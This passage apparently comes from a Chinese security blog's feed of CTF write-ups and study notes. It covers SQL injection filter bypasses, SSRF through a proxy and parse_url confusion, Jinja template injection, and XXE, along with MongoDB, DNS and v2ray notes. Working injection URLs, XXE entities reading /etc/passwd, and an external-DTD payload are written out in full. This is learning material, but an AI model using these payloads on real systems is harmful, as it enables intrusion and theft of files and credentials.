/%5eHT2mCpcvOLf/index.php?id=-1/*1222*/uniunionon/*123*/selselectect/*123*/1,2,group_concat(column_name)/*123*/frfromom/*123*/information_schema.columns/*123*/where/*123*/table_schema=0x74657374%23 HTTP/1.1 获取数据 GET /%5eHT2mCpcvOLf/index.php?id=-1/*1222*/uniunionon/*123*/selselectect/*123*/1,2,group_concat(id,context,title)/*123*/frfromom/*123*/content HTTP/1.1 chopper 这题重新复现一下一叶飘零师傅的思路，同时好好理解一下什么是ssrf 查看源码发现一个很有意思的点： 12345678910111213141516&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html;charset=UTF-8"&gt; &lt;title&gt;ISCC 2016&lt;/title&gt; &lt;div class="container"&gt; &lt;img src="proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg" alt=""&gt; &lt;p&gt;&lt;a href="admin"&gt;管理员登录&lt;/a&gt;&lt;/p&gt; &lt;/div&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt; 那个图片是通过一个url加载出来的，于是我就尝试用自己blog上的图片 果真如此： 于是这就是一典型的SSRF了 直接尝试读取文件 读取失败，尝试绕过 直接大写一个字母就行 于是可以读取任意文件 如果url不加参数 于是我们就知道了文件的位置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?php/*P_PROXY v0.2@author:haozigege@time:2016/3/19@windows extension=php_curl.dll(php.ini)@linux cd ext/curl;phpize ./configure –with-curl;make;@info url全部通过GET来传递,如果使用POST，则读取POST数据发送请求,可以给中国菜刀提供接口;cookie和其他http头部信息可以直接从请求中读取。@update 修改了host不一致的问题,去除了method参数简化了逻辑结构。*/function get_result($curlobj)&#123; $result=curl_exec($curlobj); $headerSize=curl_getinfo($curlobj,CURLINFO_HEADER_SIZE); $res_header=substr($result, 0, $headerSize); $result =substr($result,$headerSize); curl_close($curlobj); set_response_header($res_header); echo $result;&#125;function getmyheader($curlobj,$headerlines)&#123; $res_headers=$headerlines; return $res_headers;&#125;function set_response_header($headers)&#123; $headarr=explode("\r\n",$headers); foreach($headarr as $key=&gt;$value)&#123; header($value); &#125;&#125;function init_curl($link,$headers)&#123; $curlobj = curl_init(); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);//raw output curl_setopt($curlobj, CURLOPT_HTTPHEADER, $headers); curl_setopt($curlobj, CURLOPT_HEADER, 1); return $curlobj;&#125;foreach(getallheaders() as $key=&gt;$value)&#123; if ($key=='Content-Length' and isset($_POST))&#123; $post=http_build_query($_POST); $value=strlen($post); &#125; $headers[]=$key.':'.$value;&#125;if(isset($_REQUEST['url']))&#123; $link=$_REQUEST['url']; $url=explode('/',$link)[2]; /* curl setting */ $curlobj = init_curl($link,$headers); //GET if ($_SERVER['REQUEST_METHOD']=='GET')&#123; //READ FILE if(substr($link, 0,7)=='file://')&#123; echo substr($link,7); $result=""; //$result=file_get_contents(substr($link,7)); echo $result; curl_close($curlobj); &#125;else&#123; curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj, CURLOPT_HTTPHEADER, ["HOST",$url]); get_result($curlobj); &#125; &#125;else &#123; //POST curl_setopt($curlobj, CURLOPT_POST, 1); curl_setopt($curlobj, CURLOPT_POSTFIELDS,$post); curl_setopt($curlobj, CURLOPT_HTTPHEADER, ["HOST",$url]); get_result($curlobj); &#125;&#125;else&#123; echo 'invalid request';&#125;?&gt; 可以看出对协议的过滤很垃圾，就是看是不是file://开头的 尝试读取index.php和index.html，index.php没有，index.html就是原来的页面 这时候去admin目录下探测： 尝试探测一下文件： view-source:http://web.jarvisoj.com:32782/proxy.php?url=File:///opt/lampp/htdocs/admin/robots.txt 就发现robots.txt 于是读 PORT 51 记录一下curl的姿势 在自己的vps上通过curl --local-port=51进行访问 curl命令是一个很强大的命令，由于浏览器访问网站的时候存在重定向的问题，于是可以直接用curl访问原始的网页，cybrics的签到题就是这个思路 1234DESCRIPTION curl is a tool to transfer data from or to a server, using one of the supported protocols (DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET and TFTP). The command is designed to work without user interaction. 可以看到curl支持很多协议，包括POP3 常见的用法 curl https://prontosil.club 直接访问原始页面 curl -I https://prontosil.club 得到请求头 curl -H发送自定义的请求头 curl -d发送post请求 curl命令详解 localhost 只能在本地访问， 伪造请求头即可 login 注意抓包，请求头中有hint 参考这篇文章]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记录php代码审计]]></title>
    <url>%2F2019%2F08%2F16%2F%E8%AE%B0%E5%BD%95php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[怎么过去呢 12345678910111213141516171819if(isset($_POST['url']) &amp;&amp; parse_url($_POST['url'])['host']=='www.baidu.com')&#123; var_dump(parse_url($_POST['url'])['host']); $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $_POST['url']); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); $content = curl_exec($curl); echo $content; curl_close($curl); $filename='download/'.rand().';img1.jpg'; file_put_contents($filename,$content); echo $_POST['url']; $img="&lt;img src=\"".$filename."\"/&gt;"; echo $img;&#125;else&#123; echo "you need post url: http://www.ichunqiu.com";&#125; 这里主要还是利用parse_url这个函数 其实这里利用的是一个parse_url和libcurl之间的差异 匹配规则： 12345php parse_url：host: 匹配最后一个@后面符合格式的hostlibcurl：host：匹配第一个@后面符合格式的host 比如这个URL http://u:p@a.com:80@b.com/ parse_url解析结果 1234schema: http host: b.comuser: upass: p@a.com:80 libcurl解析结果： 123456schema: httphost: a.comuser: upass: pport: 80后面的@b.com/会被忽略掉 这样我么就可以构造payload: url=file://@127.0.0.1:80@www.baidu.com/./..//var/www/html/flag.php parse_url解析出www.baidu.com绕过if 然后curl解析file协议 ssrf绕过记录 Some trick in ssrf and unserialize() parse_url函数的问题 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phperror_reporting(0);$_GET=Add_S($_GET);$_POST=Add_S($_POST);$_COOKIE=Add_S($_COOKIE);$_REQUEST=Add_S($_REQUEST);function Add_S($array)&#123;foreach($array as $key=&gt;$value)&#123; if(!is_array($value))&#123; $check= preg_match('/regexp|and|like|\"|%|insert|update|delete|union|into|load_file|outfile|\/\*/i', $value); if($check) &#123; exit("Hacker!"); &#125; &#125;else&#123; $array[$key]=Add_S($array[$key]); &#125; &#125;return $array;&#125;function Measurement_url()&#123; $url=parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); $Keyword=array("from","select","like","or"); foreach($query as $key) &#123; foreach($Keyword as $value) &#123; if(preg_match("/".$value."/",strtolower($key))) &#123; die("fuck u!"); &#125; &#125;&#125;&#125;?&gt; 在Add_S函数中把一些关键字都给过滤了，同时还有一部分关键字是在Measurement_url函数中过滤的，但是这个函数中有一个parse_url函数 http://127.0.0.1///info/parseurl.php?sql=select 这种形式的URL经过parse_url后会返回false。。 于是可以绕过的payload如下 http://118.126.113.78///web1/?id=1' ^ 1=extractvalue(1,concat(0x3a,(select password from sql_inject1 limit 3,1),0x3a))--+ 具体parse_url漏洞的分析可以参考一叶飘零师傅的文章 然而我在本地测试的时候： 并没有成功，php的版本： 这就很奇怪了 12345678&lt;?php $url = "http://localhost///web/trick1/parse.php?sql=select";$parse_url_result = parse_url($url);print_r($parse_url_result); ?&gt; 一道入群题 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?php highlight_file(__FILE__);function check_inner_ip($url) &#123; $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url); if (!$match_result) &#123; die('url fomat error'); &#125; try &#123; $url_parse=parse_url($url); &#125; catch(Exception $e) &#123; die('url fomat error'); return false; &#125; $hostname=$url_parse['host']; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16; &#125; function safe_request_url($url) &#123; if (check_inner_ip($url)) &#123; echo $url.' is inner ip'; &#125; else &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info['redirect_url']) &#123; safe_request_url($result_info['redirect_url']); &#125; curl_close($ch); var_dump($output); &#125; &#125; $url = $_GET['url']; if(!empty($url))&#123; safe_request_url($url); &#125; ?&gt; 很明显这是一道ssrf的题目，白名单，只能用如下协议http|https|gopher|dict 两个payload均可 12payload1: ?url=http://127.0.0.1./flag.phppayload2: ?url=http://@127.0.0.1:80@baidu.com/flag.php 然后开始爆破内网的ip和端口 居然不记得怎么用Burp同时爆破两个字段了，查了一下 https://bbs.ichunqiu.com/thread-17395-1-1.html 可以得到172.11.243.81:8080和172.11.243.218:3306，分别为一个flask服务和mysql服务。 通过http访问内网的flask 得到源码 12345678910111213141516import flaskimport osapp = flask.Flask(__name__)app.config['HINT'] = os.environ.pop('HINT')@app.route('/')def index(): return open(__file__).read()@app.route('/yulige/&lt;path:yulige&gt;')def yulige(yulige): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist])+s return flask.render_template_string(safe_jinja(yulige))if __name__ == '__main__': app.run("0.0.0.0",port=8080) 模板注入得到HINT payload 12#payload:&#123;&#123;url_for.__globals__[%27current_app%27].config[%27HINT%27]&#125;&#125;#payload:&#123;&#123;get_flashed_messages.__globals__[%27current_app%27].config[%27HINT%27]&#125;&#125; string(29) &quot;mysql_user_is_yuligeeee123321&quot;]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[new Bugku]]></title>
    <url>%2F2019%2F08%2F16%2Fnew-Bugku%2F</url>
    <content type="text"><![CDATA[web26 12345678910111213141516171819&lt;?php $num=$_GET['num']; $str=$_GET['str']; show_source(__FILE__); if (isset($num)&amp;&amp;isset($str)) &#123; if (preg_match('/\d+/sD',$str)) &#123; echo "vagetable hhhh"; exit(); &#125; $result=is_numeric($num) and is_numeric($str); if ($result) &#123; include "flag.php"; echo "$flag"; &#125; else&#123; echo "vagetablessssss"; &#125; &#125; ?&gt;]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDb学习]]></title>
    <url>%2F2019%2F08%2F16%2FMongoDb%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[最近接触了一些NoSQL的题目，主要的数据库还是以MongoDb为主，于是总结一下MongoDb的学习 MongoDb中的数据库，集合，文档和传统的关系型数据的对应就不用细说了 db显示当前使用的数据库 show dbs显示所有可用的数据库，如果一个数据库里面啥都没有这里就不会显示 use xxx指定使用哪种个数据库，如果不存在会自动创建 show tables显示当前数据库下所有的表(又回到了关系型数据库的概念了23333) 后面的实验都在test数据库下： 123&gt; show tablesrunoobusers 插入数据 123&gt; db.users.insert(&#123;&apos;username&apos;:&apos;xxx&apos;,&apos;password&apos;:11111&#125;... )WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;) 当前表中的内容： 12345678&gt; db.users.find()&#123; &quot;_id&quot; : ObjectId(&quot;5d53bd7674357af54ea6fb01&quot;), &quot;username&quot; : &quot;prontosil&quot;, &quot;password&quot; : &quot;123456&quot; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5d53bd8574357af54ea6fb02&quot;), &quot;username&quot; : &quot;abc&quot;, &quot;password&quot; : &quot;gaashasfa&quot; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5d53bd8a74357af54ea6fb03&quot;), &quot;username&quot; : &quot;abcddd&quot;, &quot;password&quot; : &quot;gaasasdfashasfa&quot; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5d53beab74357af54ea6fb04&quot;), &quot;username&quot; : &quot;xxxppp&quot; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5d53c8ae74357af54ea6fb05&quot;), &quot;username&quot; : &quot;pxy&quot;, &quot;password&quot; : 123 &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5d5642185a9caa8f023df426&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : 123 &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5d564c035a9caa8f023df427&quot;), &quot;username&quot; : &quot;xxx&quot;, &quot;password&quot; : 11111 &#125; MongoDb聚合 MongoDB中聚合(aggregate)主要用于处理数据(诸如统计平均值,求和等)，并返回计算后的数据结果。有点类似sql语句中的 count(*)。 参考菜鸟教程中的栗子： 集合中的数据如下： 123456789101112131415161718192021222324252627&#123; _id: ObjectId(7df78ad8902c) title: &apos;MongoDB Overview&apos;, description: &apos;MongoDB is no sql database&apos;, by_user: &apos;runoob.com&apos;, url: &apos;http://www.runoob.com&apos;, tags: [&apos;mongodb&apos;, &apos;database&apos;, &apos;NoSQL&apos;], likes: 100&#125;,&#123; _id: ObjectId(7df78ad8902d) title: &apos;NoSQL Overview&apos;, description: &apos;No sql database is very fast&apos;, by_user: &apos;runoob.com&apos;, url: &apos;http://www.runoob.com&apos;, tags: [&apos;mongodb&apos;, &apos;database&apos;, &apos;NoSQL&apos;], likes: 10&#125;,&#123; _id: ObjectId(7df78ad8902e) title: &apos;Neo4j Overview&apos;, description: &apos;Neo4j is no sql database&apos;, by_user: &apos;Neo4j&apos;, url: &apos;http://www.neo4j.com&apos;, tags: [&apos;neo4j&apos;, &apos;database&apos;, &apos;NoSQL&apos;], likes: 750&#125;, 使用aggregate语句： 123456789101112131415&gt; db.mycol.aggregate([&#123;$group : &#123;_id : &quot;$by_user&quot;, num_tutorial : &#123;$sum : 1&#125;&#125;&#125;])&#123; &quot;result&quot; : [ &#123; &quot;_id&quot; : &quot;runoob.com&quot;, &quot;num_tutorial&quot; : 2 &#125;, &#123; &quot;_id&quot; : &quot;Neo4j&quot;, &quot;num_tutorial&quot; : 1 &#125; ], &quot;ok&quot; : 1&#125;&gt; 它类似于： select by_user, count(*) from mycol group by by_user]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>MongoDb</tag>
        <tag>NoSQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS解析记录]]></title>
    <url>%2F2019%2F08%2F16%2FDNS%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[又遇到了一到头疼的MISC签到题，虽说有点脑洞但还是基础知识积累的不够。 DNS解析记录： A记录、AAAA记录、CNAME记录、MX记录、NS记录、TXT记录、SRV记录、URL转发 各种记录简记如下： A记录： 将域名指向一个IPv4地址（例如：100.100.100.100），需要增加A记录 CNAME记录： 如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录。这个域名一般是主机服务商提供的一个域名 MX记录： 建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录 NS记录： 域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录 TXT记录： 可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录 AAAA记录： 将主机名（或域名）指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA记录 SRV记录： 添加服务记录服务器服务记录时会添加此项，SRV记录了哪台计算机提供了哪个服务。格式为：服务的名字.协议的类型（例如：_example-server._tcp）。 SOA记录： SOA叫做起始授权机构记录，NS用于标识多台域名解析服务器，SOA记录用于在众多NS记录中那一台是主服务器 PTR记录： PTR记录是A记录的逆向记录，又称做IP反查记录或指针记录，负责将IP反向解析为域名 显性URL转发记录： 将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址。例如：将www.liuht.cn显性转发到www.itbilu.com后，访问www.liuht.cn时，地址栏显示的地址为：www.itbilu.com。 隐性UR转发记录L： 将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址，隐性转发会隐藏真实的目标地址。例如：将www.liuht.cn显性转发到www.itbilu.com后，访问www.liuht.cn时，地址栏显示的地址仍然是：www.liuht.cn。 所以这题就是： 1234567服务器: 192.168.1.1Address: 192.168.1.1非权威应答:gamectf.com text = &quot;flag&#123;welcome_TXT&#125;&quot; 比如我的域名解析记录： 用dig命令也行： 12345678910111213141516171819$ dig -t txt gamectf.com ; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.3-Ubuntu &lt;&lt;&gt;&gt; -t txt gamectf.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 16974;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;gamectf.com. IN TXT;; ANSWER SECTION:gamectf.com. 600 IN TXT &quot;flag&#123;welcome_TXT&#125;&quot;;; Query time: 26 msec;; SERVER: 192.168.1.1#53(192.168.1.1);; WHEN: Fri Aug 16 07:18:56 CST 2019;; MSG SIZE rcvd: 70 使用dig命令甚至可以直观地感受到DNS解析的全过程，然而在我的WSL上只有一点点记录]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[v2ray学习]]></title>
    <url>%2F2019%2F08%2F15%2Fv2ray%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[V2Ray 使用 inbound(传入) 和 outbound(传出) 的结构，这样的结构非常清晰地体现了数据包的流动方向，同时也使得 V2Ray 功能强大复杂的同时而不混乱，清晰明了。形象地说，我们可以把 V2Ray 当作一个盒子，这个盒子有入口和出口(即 inbound 和 outbound)，我们将数据包通过某个入口放进这个盒子里，然后这个盒子以某种机制（这个机制其实就是路由，后面会讲到）决定这个数据包从哪个出口吐出来。以这样的角度理解的话，V2Ray 做客户端，则 inbound 接收来自浏览器数据，由 outbound 发出去(通常是发到 V2Ray 服务器)；V2Ray 做服务器，则 inbound 接收来自 V2Ray 客户端的数据，由 outbound 发出去(通常是如 Google 等想要访问的目标网站)。 v2ray的工作原理： 客户端： 假设客户端配置inbounds，post为1080，协议是socks。首先需要在浏览器中设置代理sock host:127.0.0.1 port 1080 如果访问google.com 那么浏览器的数据包会发送到本机的1080端口，这个时候数据包被本机的v2ray客户端收到 再看outbounds。协议是vmess，v2ray客户端接收到数据包之后打包成vmess的格式并且用预设的id加密，然后发送到服务器地址xxxx，端口pppp 所以如下的配置大概就能理解了： 客户端： 1234567891011121314151617181920212223242526272829303132333435&#123; "inbounds": [ &#123; "port": 1080, // 监听端口 "protocol": "socks", // 入口协议为 SOCKS 5 "sniffing": &#123; "enabled": true, "destOverride": ["http", "tls"] &#125;, "settings": &#123; "auth": "noauth" //socks的认证设置，noauth 代表不认证，由于 socks 通常在客户端使用，所以这里不认证 &#125; &#125; ], "outbounds": [ &#123; "protocol": "vmess", // 出口协议 "settings": &#123; "vnext": [ &#123; "address": "serveraddr.com", // 服务器地址，请修改为你自己的服务器 IP 或域名 "port": 16823, // 服务器端口 "users": [ &#123; "id": "b831381d-6324-4d53-ad4f-8cda48b30811", // 用户 ID，必须与服务器端配置相同 "alterId": 64 // 此处的值也应当与服务器相同 &#125; ] &#125; ] &#125; &#125; ]&#125; 浏览器---&gt;本机的v2ray---&gt;vps监听的端口 服务端配置： 12345678910111213141516171819202122&#123; "inbounds": [ &#123; "port": 16823, // 服务器监听端口 "protocol": "vmess", // 主传入协议 "settings": &#123; "clients": [ &#123; "id": "b831381d-6324-4d53-ad4f-8cda48b30811", // 用户 ID，客户端与服务器必须相同 "alterId": 64 &#125; ] &#125; &#125; ], "outbounds": [ &#123; "protocol": "freedom", // 主传出协议 "settings": &#123;&#125; &#125; ]&#125; 在客户端配置的 inbounds 中，有一个 &quot;sniffing&quot; 字段，V2Ray 手册解释为“流量探测，根据指定的流量类型，重置所请求的目标”，这话不太好理解，简单说这东西就是从网络流量中识别出域名。这个 sniffing 有两个用处： 解决 DNS 污染； 对于 IP 流量可以应用后文提到的域名路由规则； 识别 BT 协议，根据自己的需要拦截或者直连 BT 流量 接着看服务器，服务器配置的 id 是 b831381d-6324-4d53-ad4f-8cda48b30811，所以 V2Ray 服务器接收到客户端发来的数据包时就会尝试用 b831381d-6324-4d53-ad4f-8cda48b30811 解密，如果解密成功再看一下时间对不对，对的话就把数据包发到 outbound 去，outbound.protocol 是 freedom（freedom 的中文意思是自由，在这里姑且将它理解成直连吧），数据包就直接发到 google.com 了。 参考 v2ray配置指南]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>v2ray</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xxe学习]]></title>
    <url>%2F2019%2F08%2F15%2Fxxe%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[今天做题的时候遇到了一个xxe相关的题目，难度不大，现场学习的xxe，事后来总结一下： 原题的名字是who are you，进去之后有一个输入框，输入什么就会回显什么，首先试了一下xss，只出现了alert(1) 查看页面的源代码发现： 123456789101112131415161718192021222324function play() &#123; return false; &#125; function func() &#123; // document.getElementById().value var xml = '' + '&lt;\?xml version="1.0" encoding="UTF-8"\?&gt;' + '&lt;feedback&gt;' + '&lt;author&gt;' + document.getElementById('name').value+ '&lt;/author&gt;' + '&lt;/feedback&gt;'; console.log(xml); var xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = function () &#123; if (xmlhttp.readyState == 4) &#123; // console.log(xmlhttp.readyState); // console.log(xmlhttp.responseText); var res = xmlhttp.responseText; document.getElementById('title').textContent = res &#125; &#125;; xmlhttp.open("POST", "index.php", true); xmlhttp.send(xml); return false; &#125;; 显然xml数据是拼接的，直接对&lt;script&gt;进行实体编码就能够xss，然而这题的考点并不是这个。 xml相关的自然是xxe，也就是XML 外部实体注入 这需要有一点DTD的知识： DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。 DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。 DTD的引入是为了规范XML的，从一个栗子可以看： DOCTYPE声明了XML由哪些标签，因为XML的标签不同于HTML，是可以自定义的。 DTD可以在XML文档内部声明，也可以外部引用,同时实体也可以内部声明或者外部引用 内部实体声明D 12345678DTD 实例:&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;&lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;XML 实例：&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; 外部实体声明 12345678DTD 实例:&lt;!ENTITY writer SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;&lt;!ENTITY copyright SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;XML example:&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; 最常见的引入外部实体就是通过file协议读取文件： 12345&lt;?xml version="1.0" ?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; 另一种payload 123456&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY % d SYSTEM "http://vps/evil.dtd"&gt; %d;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; 我们可以在自己的VPS上构造 1&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt; 也可以这样： 123&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE a SYSTEM "http://vps//evil.dtd"&gt;&lt;c&gt;&amp;b;&lt;/c&gt; vps上的evil.dtd内容： &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; 不同的程序支持的协议也有区别，比如今天遇到的题目就是支持php伪协议： ok到这里就差不多了。 献上拿到题目的payload： &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt; 其实就是通过php伪协议去读取文件，flag就在index.php里面 接下来看一道Google ctf2019的题目： 直奔主题好了，这个题目抓包发现传送的是json格式的数据，但是也可以修改为XML格式的数据，很神奇吧： 之后这个题目涉及到一个使用本地的dtd来盲注xxe的姿势： payload 12345678910&lt;!DOCTYPE message[ &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % ISOamso &apos; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passed&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;&amp;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &apos;&gt; %local_dtd;]&gt; 参考 CTF学习--web--XXE 菜鸟教程 未知攻焉知防——XXE漏洞攻防]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>xxe</tag>
        <tag>xml</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php-storm环境]]></title>
    <url>%2F2019%2F08%2F14%2Fphp-storm%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[继续配置了一波phpStorm的环境，感觉对这个IDE还有很多可以研究的地方 在这里可以修改php的路径，我选择了phpStudy的一个php解释器，因为其中安装了Xdebug。 配置apache的环境，选择的是Local or mounted folder,因为服务器就在本地 路由映射 之后就可以在phpStorm写完代码部署到本地的服务器上了 也可以debug了]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>phpStorm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP-Audit-Labs学习]]></title>
    <url>%2F2019%2F08%2F13%2FPHP-Audit-Labs%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php-challenge]]></title>
    <url>%2F2019%2F08%2F12%2Fphp-challenge%2F</url>
    <content type="text"><![CDATA[继续分析GitHub上的一个代码审计项目 challenge-1 12345678910111213141516171819202122232425262728293031323334353637383940$users = array( "0:9b5c3d2b64b8f74e56edec71462bd97a" , "1:4eb5fb1501102508a86971773849d266", "2:facabd94d57fc9f1e655ef9ce891e86e", "3:ce3924f011fe323df3a6a95222b0c909", "4:7f6618422e6a7ca2e939bd83abde402c", "5:06e2b745f3124f7d670f78eabaa94809", "6:8e39a6e40900bb0824a8e150c0d0d59f", "7:d035e1a80bbb377ce1edce42728849f2", "8:0927d64a71a9d0078c274fc5f4f10821", "9:e2e23d64a642ee82c7a270c6c76df142", "10:70298593dd7ada576aff61b6750b9118");$valid_user = false;$input = $_COOKIE['user'];$input[1] = md5($input[1]);foreach ($users as $user)&#123; $user = explode(":", $user); if ($input === $user) &#123; $uid = $input[0] + 0; $valid_user = true; &#125;&#125;if (!$valid_user) &#123; die("not a valid user\n");&#125;if ($uid == 0) &#123; echo "Hello Admin How can I serve you today?\n"; echo "SECRETS ....\n";&#125; else &#123; echo "Welcome back user\n";&#125; 这题只能在特定的环境下运行，根源在这里 存在这样一个bug 123456[2015-06-20 14:29 UTC] nikic@php.netDescription:------------var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]); // bool(true)on all versions: http://3v4l.org/Sjdf8 其实是内部实现的时候： 123456789101112131415161718Bucket *p1, *p2 = NULL; int result; void *pData2; ... while (p1) &#123; if (ordered &amp;&amp; !p2) &#123; ... &#125; if (ordered) &#123; if (p1-&gt;nKeyLength==0 &amp;&amp; p2-&gt;nKeyLength==0) &#123; /* numeric indices */ result = p1-&gt;h - p2-&gt;h; &lt;------------ POSSIBLE TRUNCATION if (result!=0) &#123; HASH_UNPROTECT_RECURSION(ht1); HASH_UNPROTECT_RECURSION(ht2); return result; &#125; result是32位的，而其他的是64位，这样如果我64位数据的低32位都是0就可以绕过了 同时users数组中能解密的只有第5个，想办法让两个数组相等 Cookie: users[4,294,967,296]=5;users[1]=hund 这样$user===$input同时由于$input[0]未赋初值，那就是0了，这样就是admin了 challenge-10 1234567891011121314151617181920212223242526&lt;?phperror_reporting(0);echo "&lt;!--index.phps--&gt;";if(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; 小tricks： var_dump('a'==true); 结果为true var_dump('a' == 0); 结果为true 所以id输入一个字母就能够使得!$_GET['id']为false，同时$id == 0为true $data是从一个文件中得到的结果，这时候想到php伪协议，输入a=php://input再post数据就行 eregi(&quot;111&quot;.substr($b, 